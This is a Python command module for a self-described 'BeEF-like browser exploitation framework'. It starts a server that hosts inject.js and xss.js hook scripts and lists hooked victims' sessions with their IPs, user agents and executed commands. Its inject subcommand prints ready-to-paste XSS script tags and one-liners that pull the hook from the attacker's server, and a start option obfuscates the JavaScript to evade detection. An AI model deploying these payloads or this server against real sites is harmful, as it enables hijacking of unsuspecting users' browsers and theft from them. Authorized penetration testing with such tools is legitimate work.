#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Browser Server Command - BeEF-like browser exploitation framework
"""

from interfaces.command_system.base_command import BaseCommand
from core.output_handler import print_info, print_success, print_error, print_warning, print_status
import argparse
import threading
import time

class BrowserServerCommand(BaseCommand):
    """Command to manage the browser exploitation server"""
    
    @property
    def name(self) -> str:
        return "browser_server"
    
    @property
    def description(self) -> str:
        return "Manage browser exploitation servere"
    
    def execute(self, args, **kwargs) -> bool:
        """Execute the browser server command"""
        try:
            # Normalize args - handle None, empty list, or empty string
            if args is None:
                args = []
            elif isinstance(args, str):
                args = [args] if args.strip() else []
            elif not isinstance(args, list):
                args = []
            
            # If no arguments provided, show help
            if len(args) == 0 or (len(args) == 1 and not args[0].strip()):
                self.show_help()
                return True
            
            # Check if framework is available (only needed for some commands)
            if not hasattr(self, 'framework') or self.framework is None:
                # For help, we don't need framework
                if args[0].lower() in ['help', '--help', '-h']:
                    self.show_help()
                    return True
                print_error("Framework not available")
                return False
            
            command = args[0].lower().strip()
            
            if command == "start":
                return self.start_server(args[1:] if len(args) > 1 else [])
            elif command == "stop":
                return self.stop_server()
            elif command == "status":
                return self.show_status()
            elif command == "sessions":
                return self.show_sessions()
            elif command == "inject":
                return self.show_injection_script(args[1:] if len(args) > 1 else [])
            elif command == "urls":
                return self.show_urls()
            elif command in ["help", "--help", "-h"]:
                self.show_help()
                return True
            else:
                print_error(f"Unknown command: {command}")
                self.show_help()
                return False
                
        except AttributeError as e:
            print_error(f"Error: Missing attribute - {e}")
            # Try to show help anyway
            try:
                self.show_help()
            except:
                pass
            return False
        except ImportError as e:
            print_error(f"Error: Import failed - {e}")
            # Try to show help anyway
            try:
                self.show_help()
            except:
                pass
            return False
        except Exception as e:
            print_error(f"Error executing browser_server command: {e}")
            # Try to show help anyway
            try:
                self.show_help()
            except:
                pass
            return False
    
    def start_server(self, args) -> bool:
        """Start the browser server"""
        parser = argparse.ArgumentParser(description="Start browser server")
        parser.add_argument("--host", default="0.0.0.0", help="Host to bind to (default: 0.0.0.0)")
        parser.add_argument("--port", type=int, default=8080, help="Port to bind to (default: 8080)")
        # WebSocket removed - HTTP polling only
        parser.add_argument("--timeout", type=int, default=30, help="Request timeout in seconds (default: 30)")
        parser.add_argument("--obfuscation-level", choices=["simple", "medium", "heavy"], 
                          default=None, help="Obfuscation level: simple (minify), medium (minify+encode strings), heavy (all techniques)")
        
        try:
            parsed_args = parser.parse_args(args)
        except SystemExit:
            return False
        
        # Check if server is already running
        if hasattr(self.framework, 'browser_server') and self.framework.browser_server and self.framework.browser_server.is_running():
            print_warning("[!] Browser server is already running")
            return True
        
        # If obfuscation-level is specified, automatically enable obfuscation
        obfuscate_enabled = parsed_args.obfuscation_level is not None
        obfuscation_level = parsed_args.obfuscation_level if obfuscate_enabled else "simple"
        
        print_status(f"Starting browser server on {parsed_args.host}:{parsed_args.port}")
        print_status(f"Request timeout: {parsed_args.timeout} seconds")
        if obfuscate_enabled:
            print_status(f"JavaScript obfuscation: ENABLED ({obfuscation_level})")
        else:
            print_status(f"JavaScript obfuscation: DISABLED")
        
        try:
            # Import and start the browser server
            from core.browser_server import BrowserServer
            
            self.framework.browser_server = BrowserServer(
                host=parsed_args.host,
                port=parsed_args.port,
                timeout=parsed_args.timeout,
                framework=self.framework,
                obfuscate_js=obfuscate_enabled,
                obfuscation_level=obfuscation_level
            )
            
            # Start server in a separate thread
            server_thread = threading.Thread(
                target=self.framework.browser_server.start,
                daemon=True
            )
            server_thread.start()
            
            # Wait and check multiple times to ensure server started
            max_attempts = 5
            for attempt in range(max_attempts):
                time.sleep(0.5)  # Wait 0.5 seconds between checks
                if self.framework.browser_server.is_running():
                    print_success(f"Browser server started successfully!")
                    print_status(f"Injection script available at: http://{parsed_args.host}:{parsed_args.port}/inject.js")
                    print_status(f"XSS injection script: http://{parsed_args.host}:{parsed_args.port}/xss.js")
                    print_status(f"Management interface: http://{parsed_args.host}:{parsed_args.port}/admin")
                    print_status(f"Test page: http://{parsed_args.host}:{parsed_args.port}/test")
                    return True
            
            # If we get here, server didn't start in time
            # But check one more time - sometimes the server starts but is_running() hasn't updated yet
            time.sleep(0.5)
            if self.framework.browser_server.is_running():
                print_success(f"Browser server started successfully!")
                print_status(f"Injection script available at: http://{parsed_args.host}:{parsed_args.port}/inject.js")
                print_status(f"XSS injection script: http://{parsed_args.host}:{parsed_args.port}/xss.js")
                print_status(f"Management interface: http://{parsed_args.host}:{parsed_args.port}/admin")
                print_status(f"Test page: http://{parsed_args.host}:{parsed_args.port}/test")
                return True
            else:
                print_error("Failed to start browser server (timeout waiting for server to start)")
                return False
                
        except Exception as e:
            print_error(f"Error starting browser server: {e}")
            return False
    
    def stop_server(self) -> bool:
        """Stop the browser server"""
        if not hasattr(self.framework, 'browser_server') or not self.framework.browser_server:
            print_warning("Browser server is not running")
            return True
        
        if not self.framework.browser_server.is_running():
            print_warning("Browser server is not running")
            return True
        
        try:
            self.framework.browser_server.stop()
            # Success message is printed by stop() method
            return True
        except Exception as e:
            print_error(f"Error stopping browser server: {e}")
            return False
    
    def show_status(self) -> bool:
        """Show browser server status"""
        if not hasattr(self.framework, 'browser_server') or not self.framework.browser_server:
            print_status("Browser server: Not initialized")
            return True
        
        if self.framework.browser_server.is_running():
            print_success("Browser server: Running")
            print_status(f"HTTP Server: {self.framework.browser_server.host}:{self.framework.browser_server.port}")
            print_status(f"Active sessions: {len(self.framework.browser_server.get_sessions())}")
            print_status(f"Total requests: {self.framework.browser_server.get_total_requests()}")
        else:
            print_warning("Browser server: Stopped")
        
        return True
    
    def show_sessions(self) -> bool:
        """Show active browser sessions"""
        if not hasattr(self.framework, 'browser_server') or not self.framework.browser_server:
            print_warning("Browser server is not running")
            return True
        
        sessions = self.framework.browser_server.get_sessions()
        if not sessions:
            print_status("No active browser sessions")
            return True
        
        print_status(f"Active browser sessions ({len(sessions)}):")
        print_info("-" * 80)
        
        for session_id, session in sessions.items():
            print_status(f"Session ID: {session_id}")
            print_info(f"  User Agent: {session.user_agent}")
            print_info(f"  IP Address: {session.ip_address}")
            print_info(f"  Connected: {session.connected_at}")
            print_info(f"  Last Activity: {session.last_activity}")
            print_info(f"  Commands Executed: {session.commands_executed}")
            print_info("-" * 80)
        
        return True
    
    def show_injection_script(self, args) -> bool:
        """Show the injection script"""
        if not hasattr(self.framework, 'browser_server') or not self.framework.browser_server:
            print_warning("Browser server is not running")
            return True
        
        host = self.framework.browser_server.host
        port = self.framework.browser_server.port
        # WebSocket removed - HTTP polling only
        
        print_status("Browser injection scripts:")
        print_info("-" * 80)
        print_info(f"Standard: <script src=\"http://{host}:{port}/inject.js\"></script>")
        print_info(f"XSS Optimized: <script src=\"http://{host}:{port}/xss.js\"></script>")
        print_info("-" * 80)
        print_info("\n[*] One-liners:")
        print_info("-" * 80)
        print_info(f"Standard: <script>var s=document.createElement('script');s.src='http://{host}:{port}/inject.js';document.head.appendChild(s);</script>")
        print_info(f"XSS Optimized: <script>var s=document.createElement('script');s.src='http://{host}:{port}/xss.js';document.head.appendChild(s);</script>")
        print_info("-" * 80)
        print_status(f"Management interface: http://{host}:{port}/admin")
        
        return True
    
    def show_urls(self) -> bool:
        """Show all available URLs"""
        if not hasattr(self.framework, 'browser_server') or not self.framework.browser_server:
            print_warning("Browser server is not running")
            return True
        
        host = self.framework.browser_server.host
        port = self.framework.browser_server.port
        # WebSocket removed - HTTP polling only
        
        print_status("Available URLs:")
        print_status("-" * 60)
        print_status(f"Test Page:        http://{host}:{port}/test")
        print_status(f"Admin Interface:  http://{host}:{port}/admin")
        print_status(f"Injection Script: http://{host}:{port}/inject.js")
        print_status("-" * 60)

        
        return True
    
    def show_help(self):
        """Show help for browser_server command"""
        try:
            print_info("Browser Server Command")
            print_info("=" * 60)
            print_info("Usage: browser_server <command> [options]")
            print_info("")
            print_info("Commands:")
            print_info("  start [options]    Start the browser server")
            print_info("  stop               Stop the browser server")
            print_info("  status             Show server status")
            print_info("  sessions           Show active browser sessions")
            print_info("  inject             Show injection script")
            print_info("  urls               Show all available URLs")
            print_info("  help               Show this help")
            print_info("")
            print_info("Start options:")
            print_info("  --host HOST              Host to bind to (default: 0.0.0.0)")
            print_info("  --port PORT              HTTP port (default: 8080)")
            # WebSocket removed - HTTP polling only
            print_info("  --timeout SECONDS        Request timeout (default: 30)")
            print_info("  --obfuscation-level LVL  Obfuscation level: simple, medium, heavy")
            print_info("                           (specifying a level automatically enables obfuscation)")
            print_info("")
            print_info("Obfuscation levels:")
            print_info("  simple  - Minify code (remove whitespace, comments)")
            print_info("  medium  - Minify + encode strings (hex encoding)")
            print_info("  heavy   - All techniques (minify + encode + rename variables + dead code)")
            print_info("")
            print_info("Examples:")
            print_info("  browser_server start")
            print_info("  browser_server start --host 127.0.0.1 --port 9000")
            print_info("  browser_server start --obfuscation-level medium")
            print_info("  browser_server start --obfuscation-level heavy")
            print_info("  browser_server sessions")
            print_info("  browser_server inject")
            print_info("  browser_server urls")
        except Exception as e:
            print_error(f"Error showing help: {e}")
            import traceback
            traceback.print_exc()
